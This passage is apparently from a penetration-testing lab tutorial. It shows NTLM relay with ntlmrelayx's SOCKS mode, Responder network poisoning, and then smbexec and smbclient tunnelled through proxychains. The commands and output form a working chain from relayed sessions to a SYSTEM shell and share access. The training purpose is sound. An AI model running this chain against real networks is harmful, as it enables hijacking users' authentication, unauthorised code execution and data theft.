
Another great option of `ntlmrelayx` is `-socks`; whenever `ntlmrelayx` starts, it launches a SOCKS proxy that we can use to hold relayed authenticated sessions and keep them active, allowing us to abuse them with any tool. For example, if we have multiple targets with the option `-tf`, we can use `-socks` and keep as many connections active as possible. Let’s see this in action.

First, we run `ntlmrelayx` with the `-socks` option (we are still targeting the `SMB` protocol):
```
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -socks

Impacket v0.11.0 - Copyright 2023 Fortra
<SNIP>

[*] Servers started, waiting for connections
Type help for list of commands
ntlmrelayx>  * Serving Flask app 'impacket.examples.ntlmrelayx.servers.socksserver'
 * Debug mode: off
```

Then, we will use `Responder` to poison the network:
```
sudo python3 Responder.py -I ens192

  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

<SNIP>
```

After running `Responder` and making it poison broadcast traffic, we will notice that `ntlmrelayx` relays the `NTLM` authentication of multiple users originating from different IPs and establishes authenticated sessions on 172.16.117.50 and 172.16.117.60, adding them to its SOCKS server:
```
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -socks

Impacket v0.11.0 - Copyright 2023 Fortra
<SNIP>

[*] Servers started, waiting for connections
Type help for list of commands
ntlmrelayx>  * Serving Flask app 'impacket.examples.ntlmrelayx.servers.socksserver'
 * Debug mode: off
[*] SMBD-Thread-9: Connection from INLANEFREIGHT/[email protected] controlled, attacking target smb://172.16.117.50
[*] Authenticating against smb://172.16.117.50 as INLANEFREIGHT/RMONTY SUCCEED
[*] SOCKS: Adding INLANEFREIGHT/[email protected](445) to active SOCKS connection. Enjoy
[*] SMBD-Thread-9: Connection from INLANEFREIGHT/[email protected] controlled, attacking target smb://172.16.117.60
[*] Authenticating against smb://172.16.117.60 as INLANEFREIGHT/RMONTY SUCCEED
[*] SOCKS: Adding INLANEFREIGHT/[email protected](445) to active SOCKS connection. Enjoy
[*] SMBD-Thread-9: Connection from INLANEFREIGHT/[email protected] controlled, but there are no more targets left!
[*] SMBD-Thread-10: Connection from INLANEFREIGHT/[email protected] controlled, attacking target smb://172.16.117.50
[*] Authenticating against smb://172.16.117.50 as INLANEFREIGHT/PETER SUCCEED
[*] SOCKS: Adding INLANEFREIGHT/[email protected](445) to active SOCKS connection. Enjoy
[*] SMBD-Thread-10: Connection from INLANEFREIGHT/[email protected] controlled, attacking target smb://172.16.117.60
[*] Authenticating against smb://172.16.117.60 as INLANEFREIGHT/PETER SUCCEED
[*] SOCKS: Adding INLANEFREIGHT/[email protected](445) to active SOCKS connection. Enjoy
[*] SMBD-Thread-10: Connection from INLANEFREIGHT/[email protected] controlled, but there are no more targets left!
[*] SMBD-Thread-11: Connection from INLANEFREIGHT/[email protected] controlled, attacking target smb://172.16.117.50
[*] Authenticating against smb://172.16.117.50 as INLANEFREIGHT/NPORTS SUCCEED
[*] SOCKS: Adding INLANEFREIGHT/[email protected](445) to active SOCKS connection. Enjoy
[*] SMBD-Thread-11: Connection from INLANEFREIGHT/[email protected] controlled, attacking target smb://172.16.117.60
[*] Authenticating against smb://172.16.117.60 as INLANEFREIGHT/NPORTS SUCCEED
[*] SOCKS: Adding INLANEFREIGHT/[email protected](445) to active SOCKS connection. Enjoy
```

The `-socks` options enable a command-line interface within `ntlmrelayx`; the `help` command prints the available commands (you can continue typing interactive commands even if the debug messages keep printing):
```
ntlmrelayx> help

Documented commands (type help <topic>):
========================================
help  socks

Undocumented commands:
======================
EOF  exit  finished_attacks  startservers  stopservers  targets
```

The `socks` interactive command lists the active sessions:
```
ntlmrelayx> socks

Protocol  Target         Username              AdminStatus  Port
--------  -------------  --------------------  -----------  ----
SMB       172.16.117.50  INLANEFREIGHT/RMONTY  FALSE        445
SMB       172.16.117.50  INLANEFREIGHT/PETER   TRUE         445
SMB       172.16.117.50  INLANEFREIGHT/NPORTS  FALSE        445
SMB       172.16.117.60  INLANEFREIGHT/RMONTY  FALSE        445
SMB       172.16.117.60  INLANEFREIGHT/PETER   FALSE        445
SMB       172.16.117.60  INLANEFREIGHT/NPORTS  FALSE        445
```

The option `-socks` makes `ntlmrelayx` act as a proxy, meaning that we can combine it with `proxychains` to use the sessions it holds. Only one authenticated session belonging to `INLANEFREIGHT/PETER` has administrative privileges on the relay target 172.16.117.50 (it has `AdminStatus` set to `TRUE`). We can tunnel any `impacket` tool via `proxychains` to abuse the authenticated session. However, first, we must set the `proxychains` configuration file to use `ntlmrelayx`’s default proxy port, `1080`, for SOCKS4/5. By default, the location of the `proxychains` configuration file on Linux is `/etc/proxychains.conf`:
```
cat /etc/proxychains4.conf | grep socks4

#       proxy types: http, socks4, socks5
socks4  127.0.0.1 1080
```

**Note:** Depending on the `proxychains` version installed, the configuration filename can be `/etc/proxychains4.conf` or `/etc/proxychains.conf`.

We will use the administrative authenticated session of `INLANEFREIGHT/PETER` to get remote code execution on 172.16.117.50. We will tunnel `smbexec.py` via `proxychains` using the same domain name and username. We will use the `-no-pass` option to prevent `smbexec.py` from prompting us for a password because we will abuse the authenticated session established held by `ntlmrelayx`’s SOCKS proxy (remember that we need to keep `ntlmrelayx` running to utilize the authenticated sessions available on the SOCKs server, otherwise if we close it, its SOCKS server also closes):
```
proxychains4 -q smbexec.py INLANEFREIGHT/[email protected] -no-pass

Impacket v0.11.0 - Copyright 2023 Fortra

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami

nt authority\system
```

However, when we do not have any administrative permissions on the target(s), when the `AdminStatus` is `FALSE`, we can still establish a session to connect to a shared folder or perform other nonadministrative tasks. For example, let’s use the `RMONTY` account to connect to 172.16.117.50, list all shared folders, and connect to the `Finance` shared folder:

```
proxychains4 -q smbclient.py INLANEFREIGHT/[email protected] -no-pass

Impacket v0.11.0 - Copyright 2023 Fortra

Type help for list of commands
# shares

ADMIN$
C$
Finance
IPC$
# use Finance
# ls
drw-rw-rw-          0  Mon Jul 31 13:25:51 2023 .
drw-rw-rw-          0  Mon Jul 31 13:25:51 2023 ..
-rw-rw-rw-         18  Mon Jul 17 20:07:49 2023 flag.txt
-rw-rw-rw-         22  Mon Jul 17 20:07:49 2023 report.txt
# exit
```

Although having access to shared folders might not seem very helpful, in the upcoming sections, we will learn about other techniques that we can chain with having access to shared folders to force clients to perform actions without their consent.